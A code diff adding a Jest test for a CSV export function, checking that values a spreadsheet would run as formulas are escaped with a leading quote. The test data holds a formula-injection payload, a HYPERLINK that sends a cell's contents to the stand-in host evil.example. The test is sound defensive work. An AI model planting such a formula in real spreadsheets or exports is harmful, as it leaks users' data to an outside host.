@@ -88,6 +88,17 @@ describe('generateFieldCsv', () => {
     const [, , dataRow] = parse<string[]>(generateFieldCsv(columns, [standardFieldRow])).data;
     expect(dataRow.slice(3, PREFIX_COLUMN_COUNT)).toEqual(['', '', '', '']);
   });
+
+  it('should neutralize org-sourced text that a spreadsheet would evaluate as a formula', () => {
+    const formulaLabel = '=HYPERLINK("https://evil.example/?"&A1,"Click")';
+    const formulaRow = buildRow({ label: formulaLabel, createdBy: '@SUM(1,2)' });
+    const [, , dataRow] = parse<string[]>(generateFieldCsv(columns, [formulaRow])).data;
+
+    expect(dataRow[2]).toBe(`'${formulaLabel}`);
+    expect(dataRow[4]).toBe(`'@SUM(1,2)`);
+    // Plain text is left alone
+    expect(dataRow[1]).toBe('Custom__c');
+  });
 });
 
 describe('generateFieldWorksheet', () => {
